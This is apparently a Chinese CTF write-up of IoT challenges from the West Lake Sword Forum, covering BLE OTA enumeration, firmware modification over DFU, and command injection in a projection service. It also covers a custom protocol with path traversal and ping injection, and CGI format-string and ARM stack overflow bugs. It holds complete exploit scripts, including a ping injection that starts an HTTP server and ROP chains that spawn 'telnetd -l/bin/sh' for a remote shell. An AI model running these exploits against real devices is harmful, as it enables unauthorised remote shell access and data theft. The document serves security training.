Service (0xff00 - 0xff05, 2 characteristics)DeclarationHandle: 0xff00Type: 2800 (Primary Service declaration)Value: AE5D1E47-5C13-43A0-8635-82AD38A1381F (Guess: WICED - OTA)Permissions: Read (no authen/author)
Characteristic (1 descriptors)DeclarationHandle: 0xff01Type: 2803 (Characteristic declaration)Value:Properties: Indicate, Notify, WriteHandle: 0xff02UUID: A3DD50BF-F7A7-4E99-838E-570A086C661B (Guess: WICED - OTA Control Point)Permissions: Read (no authen/author)
DescriptorHandle: 0xff03Type: 2902 (Client Characteristic Configuration declaration)Value: b'x00x00'Permissions: Read (no authen/author), Write (higher layer specifies authen/author)
Characteristic (0 descriptors)DeclarationHandle: 0xff04Type: 2803 (Characteristic declaration)Value:Properties: WriteHandle: 0xff05UUID: A2E86C7A-D961-4091-B74F-2409E72EFE26 (Guess: WICED - OTA Data)        Permissions: Read (no authen/author)

可知 flag 为 sEcvRe_yOur_oTA!。

SourcellXu

H4lo

Orca

Catalpa

raax

chumen77

世界上最后一个男人

nocbtm

aodzip

西湖论剑IoT部分题目：

tip：这文章是小编职业生涯最大挑战之二，之一请大家回顾历史文章。如果想和小编一起暴打出题者，请看到文章结尾的同学点击下方，一起加入我们，我给兄弟萌一一指出来是谁出的题。

传闻中安恒信息有个神秘组织？？？


```
dfu-util 0.9Copyright 2005-2009 Weston Schmidt, Harald Welte and OpenMoko Inc.Copyright 2010-2016 Tormod Volden and Stefan SchmidtThis program is Free Software and has ABSOLUTELY NO WARRANTYPlease report bugs to http://sourceforge.net/p/dfu-util/tickets/Found DFU: [1f3a:1010] ver=0215, devnum=100, cfg=1, intf=0, path="3-6", alt=4, name="rom", serial="UNKNOWN"Found DFU: [1f3a:1010] ver=0215, devnum=100, cfg=1, intf=0, path="3-6", alt=3, name="kernel", serial="UNKNOWN"Found DFU: [1f3a:1010] ver=0215, devnum=100, cfg=1, intf=0, path="3-6", alt=2, name="env", serial="UNKNOWN"Found DFU: [1f3a:1010] ver=0215, devnum=100, cfg=1, intf=0, path="3-6", alt=1, name="u-boot", serial="UNKNOWN"Found DFU: [1f3a:1010] ver=0215, devnum=100, cfg=1, intf=0, path="3-6", alt=0, name="all", serial="UNKNOWN"
```



```
dfu-util -R -a kernel -U kernel.itb
```



```
dumpimage -l kernel.itbFIT description: Generic Allwinner FIT ImageCreated: Wed Mar 9 22:38:14 2022Image 0 (kernel-1)Description: Linux kernelCreated: Wed Mar 9 22:38:14 2022Type: Kernel ImageCompression: uncompressedData Size: 4579584 Bytes = 4472.25 KiB = 4.37 MiBArchitecture: ARMOS: LinuxLoad Address: 0x80000000Entry Point: 0x80000000Hash algo: sha1Hash value: 2bf3fcc2fbb60832f5449f7f15c236321c9920b5Image 1 (initrd-1)Description: Linux initrdCreated: Wed Mar 9 22:38:14 2022Type: RAMDisk ImageCompression: uncompressedData Size: 4133979 Bytes = 4037.09 KiB = 3.94 MiBArchitecture: ARMOS: LinuxLoad Address: unavailableEntry Point: unavailableHash algo: sha1Hash value: 170343129ac6eb0ce7268ecabac2aabb591c3090Image 2 (fdt-1)Description: Flattened Device Tree blobCreated: Wed Mar 9 22:38:14 2022Type: Flat Device TreeCompression: uncompressedData Size: 16195 Bytes = 15.82 KiB = 0.02 MiBArchitecture: ARMHash algo: sha1Hash value: 041dedf1ecb4dbf9f52aa5bb56bf5850c57e6aacDefault Configuration: 'conf-1'Configuration 0 (conf-1)Description: Linux Bootable FITKernel: kernel-1Init Ramdisk: initrd-1FDT: fdt-1Hash algo: crc32 Hash value: unavailable
```



```
dumpimage -l kernel.itb -p 0 -o kernel_1dumpimage -l kernel.itb -p 1 -o initrd_1dumpimage -l kernel.itb -p 2 -o fdt.dtbExtracted:Image 2 (fdt-1)Description: Flattened Device Tree blobCreated: Wed Mar 9 22:38:14 2022Type: Flat Device TreeCompression: uncompressedData Size: 16195 Bytes = 15.82 KiB = 0.02 MiBArchitecture: ARMHash algo: sha1 Hash value: 041dedf1ecb4dbf9f52aa5bb56bf5850c57e6aac
```



```
dtc -I dtb -O dts fdt.dtb > fdt.dts
```



```
chosen {#address-cells = <0x01>;#size-cells = <0x01>; ranges; bootargs = "console=ttyS0,115200 rdinit=/bin/sh";};
```



```
dtc -I dts -O dtb fdt.dts >fdt.dtb
```



```
/dts-v1/;/ { description = "Generic Allwinner FIT Image";#address-cells = <1>; images { kernel-1 { description = "Linux kernel"; data = /incbin/("kernel_1");type = "kernel"; arch = "arm"; os = "linux"; compression = "none"; load = <0x80000000>; entry = <0x80000000>;hash@1 { algo = "sha1"; }; }; initrd-1 { description = "Linux initrd"; data = /incbin/("initrd_1");type = "ramdisk"; arch = "arm"; os = "linux"; compression = "none";hash@1 { algo = "sha1"; }; }; fdt-1 { description = "Flattened Device Tree blob"; data = /incbin/("fdt.dtb");type = "flat_dt"; arch = "arm"; compression = "none";hash@1 { algo = "sha1"; }; }; }; configurations { default = "conf-1"; conf-1 { description = "Linux Bootable FIT"; kernel = "kernel-1"; fdt = "fdt-1"; ramdisk="initrd-1";hash@0 { algo = "crc32"; }; }; };};
```



```
mkimage -f kernel.its kernel.itb
```



```
dfu-util -R -a kernel -D kernel.itb
```



```
mosquitto_pub -t 2022/hatlab/flag -h IP -m "oiU7m9ipyqFdzkUFb1vfkabZ7IqiAefslrc3ovql2dA="
```



```
__int64 __fastcall sub_BFDC50(__int64 a1, __int64 a2){ __int64 v2; // rax __int64 v3; // rax __int64 v4; // rax __int64 v6; // raxint v8; // [rsp+1Ch] [rbp-114h]char v9[16]; // [rsp+20h] [rbp-110h] BYREFchar v10[16]; // [rsp+30h] [rbp-100h] BYREFchar v11[16]; // [rsp+40h] [rbp-F0h] BYREFchar v12[16]; // [rsp+50h] [rbp-E0h] BYREFchar v13[16]; // [rsp+60h] [rbp-D0h] BYREFchar v14[16]; // [rsp+70h] [rbp-C0h] BYREFchar v15[16]; // [rsp+80h] [rbp-B0h] BYREFchar v16[16]; // [rsp+90h] [rbp-A0h] BYREFchar v17[16]; // [rsp+A0h] [rbp-90h] BYREFchar v18[16]; // [rsp+B0h] [rbp-80h] BYREFchar v19[16]; // [rsp+C0h] [rbp-70h] BYREFchar v20[16]; // [rsp+D0h] [rbp-60h] BYREF _QWORD v21[10]; // [rsp+E0h] [rbp-50h] BYREF sub_7F07A4(v21);if ( sub_8403F8(a2) == 2 ) {std::allocator<char>::allocator(v20); v2 = (*(*a2 + 56LL))(a2);std::string::string(v9, v2, v20); sub_7F0840(v21, v9, 1);std::string::~string(v9);std::allocator<char>::~allocator(v20); }else {std::allocator<char>::allocator(v20); v3 = sub_BED698(a2);std::string::string(v10, v3, v20); sub_7F0840(v21, v10, 1);std::string::~string(v10);std::allocator<char>::~allocator(v20); }std::string::string(v11);std::string::string(v12);std::string::string(v13);std::string::string(v14);std::allocator<char>::allocator(v20);std::string::string(v15, "action", v20); sub_770750(v21, v15, v11);std::string::~string(v15);std::allocator<char>::~allocator(v20);std::allocator<char>::allocator(v20);std::string::string(v16, "fastcode", v20); sub_770750(v21, v16, v12);std::string::~string(v16);std::allocator<char>::~allocator(v20);std::allocator<char>::allocator(v20);std::string::string(v17, "fastpwd", v20); sub_770750(v21, v17, v13);std::string::~string(v17);std::allocator<char>::~allocator(v20);std::allocator<char>::allocator(v20);std::string::string(v18, "session", v20); sub_770750(v21, v18, v14);std::string::~string(v18);std::allocator<char>::~allocator(v20);std::allocator<char>::allocator(v20);std::string::string(v19, "{"errorcode":"0","message":"projection ok"}", v20);std::allocator<char>::~allocator(v20);if ( cmp1(v11, "stop") ) { sub_BB686A(*(a1 + 232)); sub_BD1FE2(); }else { v4 = sub_BB686A(*(a1 + 232)); sub_C004C8(v4);if ( std::string::empty(v12) != 1 && std::string::empty(v13) != 1 ) { v6 = sub_BB686A(*(a1 + 232)); v8 = sub_BD1D0A(v6, v12, v13, v14);if ( v8 < 0 ) {if ( v8 == -2 )std::string::operator=(v19, "{"errorcode":"-2","message":"qr timeout"}");elsestd::string::operator=(v19, "{"errorcode":"-4","message":"projection failed"}"); } }else {std::string::operator=(v19, "{"errorcode":"-3","message":"parameter error"}"); } }std::string::string(v20, v19); sub_BF5C9E(a1, v20, 0LL);std::string::~string(v20); (*(**(a1 + 16) + 40LL))(*(a1 + 16), 0LL, 0LL, -1LL);std::string::~string(v19);std::string::~string(v14);std::string::~string(v13);std::string::~string(v12);std::string::~string(v11); sub_7F07D4(v21);return 1LL;}
```



```
__int64 __fastcall sub_BD1D0A(__int64 a1, __int64 a2, __int64 a3, std::string *a4){unsigned int v5; // ebx __int64 v6; // rax __int64 v7; // rax __int64 v8; // rax __int64 v9; // raxconst char *v10; // rax __int64 v11; // rbxvoid (__fastcall *v12)(__int64, char *); // r12char v16[16]; // [rsp+30h] [rbp-3B0h] BYREFchar v17[16]; // [rsp+40h] [rbp-3A0h] BYREFchar v18[352]; // [rsp+50h] [rbp-390h] BYREFchar buf[256]; // [rsp+1B0h] [rbp-230h] BYREFint v20; // [rsp+2B0h] [rbp-130h]char s[256]; // [rsp+2C0h] [rbp-120h] BYREFint v22; // [rsp+3C0h] [rbp-20h]unsigned __int64 v23; // [rsp+3C8h] [rbp-18h]
 v23 = __readfsqword(0x28u);if ( std::string::empty(a4) != 1 && sub_47D427(a1 + 6680, a4) )return -2;std::ostringstream::basic_ostringstream(v18, 16LL); v6 = std::operator<<<std::char_traits<char>>(v18, " --mod=fastcontrol --fastcode=""); v7 = std::operator<<<char>(v6, a2); v8 = std::operator<<<std::char_traits<char>>(v7, "" --pwd=""); v9 = std::operator<<<char>(v8, a3);std::operator<<<std::char_traits<char>>(v9, "" --projection=1");memset(buf, 0, sizeof(buf)); v20 = 0; readlink("/proc/self/exe", buf, 0x104uLL);memset(s, 0, sizeof(s)); v22 = 0;std::ostringstream::str(v16, v18); v10 = std::string::c_str(v16);sprintf(s, ""%s" %s", buf, v10);std::string::~string(v16);if ( sub_60A256(a1 + 4952) ) { v11 = sub_60A268(a1 + 4952); v12 = *(*v11 + 232LL);std::allocator<char>::allocator(v16);std::string::string(v17, s, v16); v12(v11, v17);std::string::~string(v17);std::allocator<char>::~allocator(v16); } v5 = 0;std::ostringstream::~ostringstream(v18);return v5;}
```



```
#!/bin/bashIP=$1PORT=$2CMD=$3
curl -i -s -k -X $'GET' -H $'Host: 10.100.100.5:49496' "http://$IP:$PORT/projection?action=stop1&fastcode=12&fastpwd=2";$3;"" > /dev/null
echo "OK"
```



```
"decoding failed with codepoint"
```



```
header:+--------+---------+-----------+----------+---------+---------+| MAGIC | VERSION | TIMESTAMP | DATACRC | DATALEN | DATA |+--------+---------+-----------+----------+---------+---------+ 头部定义，MAGIC：代表一个请求的开始，固定字节序列VERSION：当前协议版本号TIMESTAMP：本次请求的时间戳DATACRC：载荷的 CRC 校验和DATALEN：载荷的长度
data:+--------+---------+------------+----------+| OPCODE | ENCFLAG | ENCSESSION | PAYLOAD |+--------+---------+------------+----------+数据部分定义，OPCODE：表示访问哪一个功能接口ENCFLAG：标识载荷数据是否加密ENCSESSION：标识当前请求在服务端对应的 sessionPAYLOAD：JSON 格式的数据
```



```
0: login 功能1: 上传密钥功能2: logout 功能3: 获取 LOGO 图片功能，此处为漏洞点 14: ping 网络诊断功能，此处为漏洞点 2
```



```
{"u":<username>,"p":<password>}
```



```
{"k":<key>}
```



```
{"d":<path>}
```



```
json GetLogo::getlogo(string path){ json fail_payload; fail_payload["r"] = 0;if(path.length() >= 15){return fail_payload; }char* tmp_path = new char[100];snprintf(tmp_path, max_filename_len, logo_path_format.c_str(), path.c_str()); // BUG// open and read fileifstream cf(tmp_path);if(!cf.is_open()){return fail_payload; }string content;string buf;while(getline(cf, buf)){ content += buf; } json succ; succ["r"] = 1; succ["d"] = content;return succ;}
```



```
/home/iot/Desktop/Cpp/%s.png
```



```
/home/iot/Desktop/Cpp////config.ini.png
```



```
json Ping::ping(){ json fail_payload; fail_payload["r"] = 0;// check ip addressstring block1 = "`";string block2 = "&";string block3 = "|";string block4 = ";";string block6 = " ";string block7 = "/";if(ip_address.length() > 64){return fail_payload; }if(ip_address.find(block1) != string::npos || ip_address.find(block2) != string::npos || ip_address.find(block3) != string::npos || ip_address.find(block4) != string::npos || ip_address.find(block6) != string::npos || ip_address.find(block7) != string::npos){return fail_payload; }if(count > 10){return fail_payload; }char* cmd = new char[MAXLEN];string file_to_exec1 = "p";string file_to_exec2 = "i";string file_to_exec3 = "n";string file_to_exec4 = "g";string file_to_exec = file_to_exec1 + file_to_exec2 + file_to_exec3 + file_to_exec4;string param0 = " ";string param1 = "-";string param2 = "c";string param = param0 + param1 + param2;string tmp_format = "%d";string tmp_format2 = "%s";string tmp_cmd = file_to_exec + param + param0 + tmp_format + param0 + tmp_format2;sprintf(cmd, tmp_cmd.c_str(), count, ip_address.c_str()); system(cmd); json succ; succ["r"] = 1;return succ;}
```



```
{"i":<ip 地址>,"c":<ping 次数>}
```



```
int do_enc_dec(char* buf, unsigned int length){if(enc_key.length() != 32){return FAIL; }if(length >= MAXLEN){return FAIL; }int i = 0, j = 0;while(1){if(i >= length){break; }if(j >= 32){ j = 0; } buf[i] = buf[i] ^ enc_key.c_str()[j]; i++; j++; }return SUCCESS;}
```



```
from pwn import *import timeimport base64
crc32tab = [0x00000000, 0x77073096, 0xee0e612c, 0x990951ba,0x076dc419, 0x706af48f, 0xe963a535, 0x9e6495a3,0x0edb8832, 0x79dcb8a4, 0xe0d5e91e, 0x97d2d988,0x09b64c2b, 0x7eb17cbd, 0xe7b82d07, 0x90bf1d91,0x1db71064, 0x6ab020f2, 0xf3b97148, 0x84be41de,0x1adad47d, 0x6ddde4eb, 0xf4d4b551, 0x83d385c7,0x136c9856, 0x646ba8c0, 0xfd62f97a, 0x8a65c9ec,0x14015c4f, 0x63066cd9, 0xfa0f3d63, 0x8d080df5,0x3b6e20c8, 0x4c69105e, 0xd56041e4, 0xa2677172,0x3c03e4d1, 0x4b04d447, 0xd20d85fd, 0xa50ab56b,0x35b5a8fa, 0x42b2986c, 0xdbbbc9d6, 0xacbcf940,0x32d86ce3, 0x45df5c75, 0xdcd60dcf, 0xabd13d59,0x26d930ac, 0x51de003a, 0xc8d75180, 0xbfd06116,0x21b4f4b5, 0x56b3c423, 0xcfba9599, 0xb8bda50f,0x2802b89e, 0x5f058808, 0xc60cd9b2, 0xb10be924,0x2f6f7c87, 0x58684c11, 0xc1611dab, 0xb6662d3d,0x76dc4190, 0x01db7106, 0x98d220bc, 0xefd5102a,0x71b18589, 0x06b6b51f, 0x9fbfe4a5, 0xe8b8d433,0x7807c9a2, 0x0f00f934, 0x9609a88e, 0xe10e9818,0x7f6a0dbb, 0x086d3d2d, 0x91646c97, 0xe6635c01,0x6b6b51f4, 0x1c6c6162, 0x856530d8, 0xf262004e,0x6c0695ed, 0x1b01a57b, 0x8208f4c1, 0xf50fc457,0x65b0d9c6, 0x12b7e950, 0x8bbeb8ea, 0xfcb9887c,0x62dd1ddf, 0x15da2d49, 0x8cd37cf3, 0xfbd44c65,0x4db26158, 0x3ab551ce, 0xa3bc0074, 0xd4bb30e2,0x4adfa541, 0x3dd895d7, 0xa4d1c46d, 0xd3d6f4fb,0x4369e96a, 0x346ed9fc, 0xad678846, 0xda60b8d0,0x44042d73, 0x33031de5, 0xaa0a4c5f, 0xdd0d7cc9,0x5005713c, 0x270241aa, 0xbe0b1010, 0xc90c2086,0x5768b525, 0x206f85b3, 0xb966d409, 0xce61e49f,0x5edef90e, 0x29d9c998, 0xb0d09822, 0xc7d7a8b4,0x59b33d17, 0x2eb40d81, 0xb7bd5c3b, 0xc0ba6cad,0xedb88320, 0x9abfb3b6, 0x03b6e20c, 0x74b1d29a,0xead54739, 0x9dd277af, 0x04db2615, 0x73dc1683,0xe3630b12, 0x94643b84, 0x0d6d6a3e, 0x7a6a5aa8,0xe40ecf0b, 0x9309ff9d, 0x0a00ae27, 0x7d079eb1,0xf00f9344, 0x8708a3d2, 0x1e01f268, 0x6906c2fe,0xf762575d, 0x806567cb, 0x196c3671, 0x6e6b06e7,0xfed41b76, 0x89d32be0, 0x10da7a5a, 0x67dd4acc,0xf9b9df6f, 0x8ebeeff9, 0x17b7be43, 0x60b08ed5,0xd6d6a3e8, 0xa1d1937e, 0x38d8c2c4, 0x4fdff252,0xd1bb67f1, 0xa6bc5767, 0x3fb506dd, 0x48b2364b,0xd80d2bda, 0xaf0a1b4c, 0x36034af6, 0x41047a60,0xdf60efc3, 0xa867df55, 0x316e8eef, 0x4669be79,0xcb61b38c, 0xbc66831a, 0x256fd2a0, 0x5268e236,0xcc0c7795, 0xbb0b4703, 0x220216b9, 0x5505262f,0xc5ba3bbe, 0xb2bd0b28, 0x2bb45a92, 0x5cb36a04,0xc2d7ffa7, 0xb5d0cf31, 0x2cd99e8b, 0x5bdeae1d,0x9b64c2b0, 0xec63f226, 0x756aa39c, 0x026d930a,0x9c0906a9, 0xeb0e363f, 0x72076785, 0x05005713,0x95bf4a82, 0xe2b87a14, 0x7bb12bae, 0x0cb61b38,0x92d28e9b, 0xe5d5be0d, 0x7cdcefb7, 0x0bdbdf21,0x86d3d2d4, 0xf1d4e242, 0x68ddb3f8, 0x1fda836e,0x81be16cd, 0xf6b9265b, 0x6fb077e1, 0x18b74777,0x88085ae6, 0xff0f6a70, 0x66063bca, 0x11010b5c,0x8f659eff, 0xf862ae69, 0x616bffd3, 0x166ccf45,0xa00ae278, 0xd70dd2ee, 0x4e048354, 0x3903b3c2,0xa7672661, 0xd06016f7, 0x4969474d, 0x3e6e77db,0xaed16a4a, 0xd9d65adc, 0x40df0b66, 0x37d83bf0,0xa9bcae53, 0xdebb9ec5, 0x47b2cf7f, 0x30b5ffe9,0xbdbdf21c, 0xcabac28a, 0x53b39330, 0x24b4a3a6,0xbad03605, 0xcdd70693, 0x54de5729, 0x23d967bf,0xb3667a2e, 0xc4614ab8, 0x5d681b02, 0x2a6f2b94,0xb40bbe37, 0xc30c8ea1, 0x5a05df1b, 0x2d02ef8d] # 0x2d02ef8d to 0x2d02ef8e
def mycrc32(data): crc = 0x0for i in range(len(data)): crc = crc32tab[(crc ^ data[i]) & 0xff] ^ (crc >> 8)return crc ^ 0xFFFFFFFF
def do_enc_dec(data, key): i = 0 j = 0 length = len(data) res = bytearray(length) while True:if i >= length:breakif j >= 32: j = 0 res[i] = data[i] ^ ord(key[j]) i += 1 j += 1return res
context.log_level = "DEBUG"
# p = process("./diagnose")p = remote("20.21.2.27", 50413)
# ==== get logo ====print("Leak user info")magic = b"MULBERRY"version = 1timestamp = int(time.time())opcode = 3encflag = 0encsession = 0data = b'{"d":"///config.ini"}x00'datacrc = mycrc32(data)datalen = len(data)payload3 = magic + p32(version) + p32(timestamp) + p32(datacrc) + p32(datalen) + p32(opcode) + p32(encflag) + p32(encsession) + datap.sendline(payload3)p.recvuntil(b""r":1}")
# ==== login ====print("Login")opcode = 0# data = b'{"u":"xhlj2022","p":"mysecretpasswd"}x00' # login successdata = b'{"u":"xhlj2022","p":"C4nY0uGu3ssmE?"}x00' # login successdatacrc = mycrc32(data)datalen = len(data)payload = magic + p32(version) + p32(timestamp) + p32(datacrc) + p32(datalen) + p32(opcode) + p32(encflag) + p32(encsession) + datap.sendline(payload)p.recvuntil(b""e":")timestamp = int(p.recvuntil(b",")[:-1])print(timestamp)p.recv()
# ==== put key ====print("Upload key")opcode = 1data = b'{"k":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"}x00'datalen = len(data)datacrc = mycrc32(data)encsession = timestampencflag = 1payload2 = magic + p32(version) + p32(timestamp) + p32(datacrc) + p32(datalen) + p32(opcode) + p32(encflag) + p32(encsession) + datap.sendline(payload2)p.recvuntil(b""r":1}")
# # === ping ===print("Start HTTP server")opcode = 4data = b'{"k":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa","i":"$(python$IFS-m${IFS}http.server$IFS-d$IFS${PATH:0:1})","c":4}x00'data = base64.b64encode(do_enc_dec(data, "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"))datalen = len(data)datacrc = mycrc32(data)encsession = timestampencflag = 1payload2 = magic + p32(version) + p32(timestamp) + p32(datacrc) + p32(datalen) + p32(opcode) + p32(encflag) + p32(encsession) + datap.sendline(payload2)
print("Waiting for 15s")sleep(15)
print("Fetch flag")os.system("curl http://20.21.2.27:8000/flag.txt")
p.interactive()
```



```
int sub_108C8(){char s[20]; // [sp+0h] [bp-54h] BYREFchar s2[20]; // [sp+14h] [bp-40h] BYREFchar haystack[24]; // [sp+28h] [bp-2Ch] BYREFchar *format; // [sp+40h] [bp-14h]char *v5; // [sp+44h] [bp-10h]char *v6; // [sp+48h] [bp-Ch]int v7; // [sp+4Ch] [bp-8h]
 v7 = 0; v6 = getenv("HTTP_COOKIES");memset(s, 0, 0x11u); sub_107E8(s);if ( v6 ) {memset(haystack, 0, 0x17u);snprintf(haystack, 0x16u, "%s", v6); v5 = strstr(haystack, "uuid=");if ( v5 ) { format = v5 + 5;memset(s2, 0, 0x11u);snprintf(s2, 0x11u, v5 + 5); // bugputs(s2);if ( !strncmp(s, s2, 0x10u) ) v7 = 1; } }return v7;}char *__fastcall sub_107E8(char *a1){char *result; // r0char s[24]; // [sp+Ch] [bp-28h] BYREFchar *v4; // [sp+24h] [bp-10h]char *v5; // [sp+28h] [bp-Ch] FILE *stream; // [sp+2Ch] [bp-8h]
memset(s, 0, 0x17u); stream = fopen("/var/tmp/session", "r");if ( !stream ) {printf("No Session");exit(1); } fgets(s, 22, stream); fclose(stream); result = strstr(s, "uuid="); v5 = result;if ( result ) { v4 = v5 + 5;snprintf(s, 0x11u, "%s", v5 + 5); result = strncpy(a1, s, 0x10u); }return result;
```



```
char *__fastcall sub_10B48(char *result){unsigned __int8 *s1; // [sp+4h] [bp-D20h]char v2[3316]; // [sp+Ch] [bp-D18h] BYREFchar *v3; // [sp+D00h] [bp-24h]char *v4; // [sp+D04h] [bp-20h]size_t v5; // [sp+D08h] [bp-1Ch]int v6; // [sp+D0Ch] [bp-18h]size_t n; // [sp+D10h] [bp-14h]int v8; // [sp+D14h] [bp-10h]int v9; // [sp+D18h] [bp-Ch]char *s2; // [sp+D1Ch] [bp-8h]
 s1 = (unsigned __int8 *)result; s2 = "*#$^";if ( result ) {if ( !strncmp(result, s2, 4u) ) { v9 = s1[4]; v8 = s1[5] + 2 * v9; n = s1[6] + 4 * v8; v6 = s1[7]; v5 = s1[8] + 2 * v6;memset(v2, 0, sizeof(v2));memcpy(v2, s1, n); result = strstr(v2, "*#$^"); v4 = result;if ( result ) { v3 = &v4[v5 - 0x4D];if ( *v3 ) result = sub_10AFC(v3, v5); } }else { result = strstr(v2, "ping");if ( result ) result = (char *)sub_109B0("20.21.2.26"); } }return result;}
```



```
char *__fastcall sub_10AFC(char *result, size_t a2){ char dest[752]; // [sp+Ch] [bp-2F8h] BYREF size_t n; // [sp+2FCh] [bp-8h]
 n = a2; if ( result ) result = strncpy(dest, result, n); // bug return result;}
.text:00010AFC sub_10AFC ; CODE XREF: sub_10B48+17C↓p.text:00010AFC.text:00010AFC var_304 = -0x304.text:00010AFC src = -0x300.text:00010AFC dest = -0x2F8.text:00010AFC n = -8.text:00010AFC.text:00010AFC PUSH {R11,LR}.text:00010B00 ADD R11, SP, #4.text:00010B04 SUB SP, SP, #0x300.text:00010B08 STR R0, [R11,#src].text:00010B0C STR R1, [R11,#var_304].text:00010B10 LDR R3, [R11,#var_304].text:00010B14 STR R3, [R11,#n].text:00010B18 LDR R3, [R11,#src].text:00010B1C CMP R3, #0.text:00010B20 BEQ loc_10B3C.text:00010B24 LDR R2, [R11,#n] ; n.text:00010B28 SUB R3, R11, #-dest.text:00010B2C LDR R1, [R11,#src] ; src.text:00010B30 MOV R0, R3 ; dest.text:00010B34 BL strncpy.text:00010B38 NOP.text:00010B3C.text:00010B3C loc_10B3C ; CODE XREF: sub_10AFC+24↑j.text:00010B3C NOP.text:00010B40 SUB SP, R11, #4.text:00010B44 POP {R11,PC}
```



```
export REQUEST_METHOD=POSTexport HTTP_COOKIES='uuid=nocbtm@hatlab!!!'export CONTENT_LENGTH=3000export CONTENT_TYPE='application/x-www-form-urlencoded'cat payload.txt | gdbserver 0.0.0.0:1234 ./var/www/cgi-bin/55.cgi
```



```
export REQUEST_METHOD=POSTexport HTTP_COOKIES='uuid=nocbtm@hatlab!!!'export CONTENT_LENGTH=3000export CONTENT_TYPE='application/x-www-form-urlencoded'
cat payload.txt | ./qemu-arm-static -g 1234 -L /usr/arm-linux-gnueabi/ ./55.cgi
```



```
gdb-multiarch ./55.cgi -x xgdb.sh
```



```
set architecture arm │0x407ff6d4: 'C' <repeats 200 times>...set endian little │0x407ff79c: 'C' <repeats 200 times>... │0x407ff864: 'C' <repeats 160 times>, "334t 01"b *0x10B34 │0x407ff908: ""b *0x10B44 │0x407ff909: ""target remote 127.0.0.1:1234
```



```
import requests from pwn import * import binascii
IP = "20.21.2.27"
url = "http://{}/cgi-bin/63.cgi".format(IP)uuid = ""for i in range(2, 6): r = requests.get( url=url, headers={"COOKIES": "uuid=%{}$x".format(str(i))} ) res = r.text.split('n')[0] uuid += binascii.unhexlify(res).decode()[::-1] print(uuid) 
url = "http://{}/cgi-bin/55.cgi".format(IP)payload = b"*#$^" + b"xff" * 3 + b"xff" * 3 payload = payload.ljust(0x2b0, b"B") payload += b'telnetd -p6789 -l/bin/sh;' payload = payload.ljust(0x5A8, b"C") payload += p32(0x000109DC) r = requests.post( url=url, headers={ "COOKIES": "uuid={}".format(uuid), "Content-Type": "application/x-www-form-urlencoded" }, data=payload)
sleep(2)os.system("telnet {} 6789".format(IP))
```



```
#!/usr/bin/env python#-*- coding:utf-8 -*-# @Author : nocbtm

import osimport sysfrom pwn import *
context(arch='arm', os='linux', endian='little', word_size=32)# context.log_level = 'debug'
if len(sys.argv) < 3: print("[+] Example python exp.py ip port") exit(-1)
IP = sys.argv[1]PORT = sys.argv[2]HOST = IP + ":" + str(PORT)command = "telnetd -p6789 -l/bin/sh"
"""func returnPOP {R4-R11,PC}"""
# a 0x61# z 0x7a

binary_path = './www/cgi-bin/flc_cgi.cgi'libc_path = './lib/libc-2.13.so'
libc = ELF(libc_path)
libc_addr = 0xb6e8d000
def getStrAddr(s): off = libc.search(s) str_addr = 0 for i in off:# print(hex(i)) str_addr = libc_addr + i if (str_addr & 0xffff) >> 8 != 0xd and (str_addr & 0xffff) >> 8 != 0xa and ((str_addr & 0xffff) >> 8 > 0x7a or (str_addr & 0xffff) >> 8 < 0x61)and ((str_addr & 0xff) > 0x7a or (str_addr & 0xff) < 0x61 )and (str_addr & 0xff) != 0xd and (str_addr & 0xff) != 0xa and (str_addr & 0xff) != 0x3d: break
# print('{} addr is {:#x}'.format(s,str_addr)) return str_addr
system_addr = libc_addr + libc.sym['system']
print("system addr is " + hex(system_addr))
gadget = libc_addr + 0xfcee0 # pop {r0, pc}gadget2 = libc_addr + 0x000fd524 # pop {r0, r1, r2, r3, pc}lr_gadget = libc_addr + 0x00038a40 # pop {lr} ; add sp, sp, #4 ; bx lr
memcpy_addr = libc_addr + 0x75810strcpy_addr = libc_addr + 0x734A0command_addr = libc_addr + 0x12afd8print("command " + hex(command_addr))
tel_addr = getStrAddr('telx00')net_addr = getStrAddr('netx00')d_addr = getStrAddr('dx00')kong_addr = getStrAddr(' x00')gang_addr = getStrAddr('-x00')p_addr = getStrAddr('px00')port_addr = getStrAddr('6789x00')l_addr = getStrAddr('lx00')binsh_addr = getStrAddr('/bin/shx00')fenhao_addr = getStrAddr(';x00')
buf2 = 'A'*(0x14)buf2 += p32(command_addr) #R4buf2 += p32(command_addr) #R5buf2 += p32(command_addr)*6 #R6 - R11
# telnetd -p6789 -l/bin/sh;buf2 += p32(lr_gadget) + p32(gadget2) + p32(0x01010101)
buf2 += p32(command_addr) + p32(tel_addr) + "A"*8 + p32(strcpy_addr)buf2 += p32(command_addr+3) + p32(net_addr) + "B"*8 + p32(strcpy_addr)buf2 += p32(command_addr+6) + p32(d_addr) + "C"*8 + p32(strcpy_addr)
buf2 += p32(command_addr+7) + p32(kong_addr) + p32(0x01010101)*2 + p32(strcpy_addr)buf2 += p32(command_addr+8) + p32(gang_addr) + "D"*8 + p32(strcpy_addr)buf2 += p32(command_addr+9) + p32(p_addr) + "E"*8 + p32(strcpy_addr)buf2 += p32(command_addr+10) + p32(port_addr) + "F"*8 + p32(strcpy_addr)buf2 += p32(command_addr+14) + p32(kong_addr) + p32(0x01010101)*2 + p32(strcpy_addr)buf2 += p32(command_addr+15) + p32(gang_addr) + "G"*8 + p32(strcpy_addr)buf2 += p32(command_addr+16) + p32(l_addr) + "H"*8 + p32(strcpy_addr)buf2 += p32(command_addr+17) + p32(binsh_addr) +"I"*8 + p32(strcpy_addr)buf2 += p32(command_addr+24) + p32(fenhao_addr) +"J"*8 + p32(strcpy_addr)
buf2 += p32(command_addr) + p32(0xbefffb74) + p32(0xbefffb74) + p32(command_addr)+ p32(0x90B4)action = 'action=command&command=network&{}=1'.format(buf2)

payload = ''payload += 'GET /cgi-bin/flc_cgi.cgi?{} HTTP/1.1rn'.format(action)payload += 'Host: {}rn'.format(HOST)payload += 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0rn'payload += 'Content-Type: application/octet-streamrn'payload += 'X-Requested-With: XMLHttpRequestrn'payload += 'Referer: http://192.168.0.1/fm.htmlrn'payload += 'rn'
while True: try: sleep(0.1) p = remote(IP, PORT) p.send(payload) content = p.recv() print(content) if 'HTTP' in content: try: p = remote(IP, 6789) if p: print("Attack Success") break except: p.close() pass
 except: p.close() pass
print("Now you can telnet {} 6789".format(IP))os.system("telnet {} 6789".format(IP))
